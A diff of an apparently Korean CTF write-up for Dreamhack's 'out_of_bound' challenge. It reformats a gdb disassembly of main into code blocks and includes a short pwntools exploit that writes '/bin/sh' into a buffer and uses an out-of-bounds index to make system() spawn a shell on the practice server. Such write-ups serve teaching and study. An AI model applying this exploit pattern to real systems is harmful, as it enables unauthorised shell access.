@@ -102,53 +102,57 @@ system이라는 명령어 에서는 안에있는 명령어를 실행한다. comm
 
 # Result
 
+> ~~~
 > Dump of assembler code for function main:
->    0x080486cb <+0&#62;:	lea    ecx,[esp+0x4]
->    0x080486cf <+4&#62;:	and    esp,0xfffffff0
->    0x080486d2 <+7&#62;:	push   DWORD PTR [ecx-0x4]
->    0x080486d5 <+10&#62;:	push   ebp
->    0x080486d6 <+11&#62;:	mov    ebp,esp
->    0x080486d8 <+13&#62;:	push   ecx
->    0x080486d9 <+14&#62;:	sub    esp,0x14
->    0x080486dc <+17&#62;:	mov    eax,gs:0x14
->    0x080486e2 <+23&#62;:	mov    DWORD PTR [ebp-0xc],eax
->    0x080486e5 <+26&#62;:	xor    eax,eax
->    0x080486e7 <+28&#62;:	call   0x804867b <initialize&#62;
->    0x080486ec <+33&#62;:	sub    esp,0xc
->    0x080486ef <+36&#62;:	push   0x8048811
->    0x080486f4 <+41&#62;:	call   0x80484b0 <printf@plt&#62;
->    0x080486f9 <+46&#62;:	add    esp,0x10
->    0x080486fc <+49&#62;:	sub    esp,0x4
->    0x080486ff <+52&#62;:	push   0x10
->    0x08048701 <+54&#62;:	push   0x804a0ac
->    0x08048706 <+59&#62;:	push   0x0
->    0x08048708 <+61&#62;:	call   0x80484a0 <read@plt&#62;
->    0x0804870d <+66&#62;:	add    esp,0x10
->    0x08048710 <+69&#62;:	sub    esp,0xc
->    0x08048713 <+72&#62;:	push   0x804881e
->    0x08048718 <+77&#62;:	call   0x80484b0 <printf@plt&#62;
->    0x0804871d <+82&#62;:	add    esp,0x10
->    0x08048720 <+85&#62;:	sub    esp,0x8
->    0x08048723 <+88&#62;:	lea    eax,[ebp-0x10]
->    0x08048726 <+91&#62;:	push   eax
->    0x08048727 <+92&#62;:	push   0x8048832
->    0x0804872c <+97&#62;:	call   0x8048540 <&#95;_scanf@plt&#62;
->    0x08048731 <+102&#62;:	add    esp,0x10
->    0x08048734 <+105&#62;:	mov    eax,DWORD PTR [ebp-0x10]
->    0x08048737 <+108&#62;:	mov    eax,DWORD PTR [eax*4+0x804a060]
->    0x0804873e <+115&#62;:	sub    esp,0xc
->    0x08048741 <+118&#62;:	push   eax
->    0x08048742 <+119&#62;:	call   0x8048500 <system@plt&#62;
->    0x08048747 <+124&#62;:	add    esp,0x10
->    0x0804874a <+127&#62;:	mov    eax,0x0
->    0x0804874f <+132&#62;:	mov    edx,DWORD PTR [ebp-0xc]
->    0x08048752 <+135&#62;:	xor    edx,DWORD PTR gs:0x14
->    0x08048759 <+142&#62;:	je     0x8048760 <main+149&#62;
->    0x0804875b <+144&#62;:	call   0x80484e0 <__stack_chk_fail@plt&#62;
->    0x08048760 <+149&#62;:	mov    ecx,DWORD PTR [ebp-0x4]
->    0x08048763 <+152&#62;:	leave  
->    0x08048764 <+153&#62;:	lea    esp,[ecx-0x4]
->    0x08048767 <+156&#62;:	ret  
+> 0x080486cb <+0&#62;:	lea    ecx,[esp+0x4]
+> 0x080486cf <+4&#62;:	and    esp,0xfffffff0
+> 0x080486d2 <+7&#62;:	push   DWORD PTR [ecx-0x4]
+> 0x080486d5 <+10&#62;:	push   ebp
+> 0x080486d6 <+11&#62;:	mov    ebp,esp
+> 0x080486d8 <+13&#62;:	push   ecx
+> 0x080486d9 <+14&#62;:	sub    esp,0x14
+> 0x080486dc <+17&#62;:	mov    eax,gs:0x14
+> 0x080486e2 <+23&#62;:	mov    DWORD PTR [ebp-0xc],eax
+> 0x080486e5 <+26&#62;:	xor    eax,eax
+> 0x080486e7 <+28&#62;:	call   0x804867b <initialize&#62;
+> 0x080486ec <+33&#62;:	sub    esp,0xc
+> 0x080486ef <+36&#62;:	push   0x8048811
+> 0x080486f4 <+41&#62;:	call   0x80484b0 <printf@plt&#62;
+> 0x080486f9 <+46&#62;:	add    esp,0x10
+> 0x080486fc <+49&#62;:	sub    esp,0x4
+> 0x080486ff <+52&#62;:	push   0x10
+> 0x08048701 <+54&#62;:	push   0x804a0ac
+> 0x08048706 <+59&#62;:	push   0x0
+> 0x08048708 <+61&#62;:	call   0x80484a0 <read@plt&#62;
+> 0x0804870d <+66&#62;:	add    esp,0x10
+> 0x08048710 <+69&#62;:	sub    esp,0xc
+> 0x08048713 <+72&#62;:	push   0x804881e
+> 0x08048718 <+77&#62;:	call   0x80484b0 <printf@plt&#62;
+> 0x0804871d <+82&#62;:	add    esp,0x10
+> 0x08048720 <+85&#62;:	sub    esp,0x8
+> 0x08048723 <+88&#62;:	lea    eax,[ebp-0x10]
+> 0x08048726 <+91&#62;:	push   eax
+> 0x08048727 <+92&#62;:	push   0x8048832
+> 0x0804872c <+97&#62;:	call   0x8048540 <&#95;_scanf@plt&#62;
+> 0x08048731 <+102&#62;:	add    esp,0x10
+> 0x08048734 <+105&#62;:	mov    eax,DWORD PTR [ebp-0x10]
+> 0x08048737 <+108&#62;:	mov    eax,DWORD PTR [eax*4+0x804a060]
+> 0x0804873e <+115&#62;:	sub    esp,0xc
+> 0x08048741 <+118&#62;:	push   eax
+> 0x08048742 <+119&#62;:	call   0x8048500 <system@plt&#62;
+> 0x08048747 <+124&#62;:	add    esp,0x10
+> 0x0804874a <+127&#62;:	mov    eax,0x0
+> 0x0804874f <+132&#62;:	mov    edx,DWORD PTR [ebp-0xc]
+> 0x08048752 <+135&#62;:	xor    edx,DWORD PTR gs:0x14
+> 0x08048759 <+142&#62;:	je     0x8048760 <main+149&#62;
+> 0x0804875b <+144&#62;:	call   0x80484e0 <__stack_chk_fail@plt&#62;
+> 0x08048760 <+149&#62;:	mov    ecx,DWORD PTR [ebp-0x4]
+> 0x08048763 <+152&#62;:	leave  
+> 0x08048764 <+153&#62;:	lea    esp,[ecx-0x4]
+> 0x08048767 <+156&#62;:	ret 
+> ~~~
+>
+> 
 
 소스코드는 다음과 같다. 입력이 되는 61번 read와 system의 119번을 보고 name과 commend의 주솟값을 알아보겠다.
 
@@ -164,8 +168,9 @@ system이라는 명령어 에서는 안에있는 명령어를 실행한다. comm
 
 
 
+> ~~~
 > from pwn import *
->
+> 
 > p=remote("host1.dreamhack.games",8257)
 > payload=p32(0x804a0b0)
 > payload+="/bin/sh"
@@ -174,7 +179,7 @@ system이라는 명령어 에서는 안에있는 명령어를 실행한다. comm
 > p.recvuntil(": ")
 > p.sendline("19")
 > p.interactive()
->
+> ~~~
 
 out_of_bound를 공격하기 위한 코드는 다음과 같다.
 
